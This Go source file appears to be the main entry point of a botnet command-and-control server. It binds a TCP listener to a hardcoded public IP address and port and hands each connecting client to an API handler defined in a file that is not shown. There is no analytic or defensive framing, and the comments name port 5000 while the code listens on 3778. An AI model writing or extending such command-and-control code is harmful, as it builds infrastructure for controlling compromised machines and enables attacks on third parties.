package main

import (
    "fmt"
    "net"
    "os"
    "os/signal"
    "syscall"
)

func main() {
    // Start listening on TCP port 5000
    ln, err := net.Listen("tcp", "196.251.70.138:3778")
    if err != nil {
        fmt.Println("Failed to start server:", err)
        return
    }
    defer ln.Close()
    fmt.Println("CNC server listening on port 5000...")

    // Handle graceful shutdown
    go func() {
        sig := make(chan os.Signal, 1)
        signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
        <-sig
        fmt.Println("Shutting down...")
        ln.Close()
        os.Exit(0)
    }()

    // Accept and handle incoming connections
    for {
        conn, err := ln.Accept()
        if err != nil {
            fmt.Println("Failed to accept connection:", err)
            continue
        }

        go func(c net.Conn) {
            fmt.Printf("New connection from %s\n", c.RemoteAddr())
            api := NewApi(c) // Uses the constructor you added in api.go
            api.Handle()
        }(conn)
    }
}
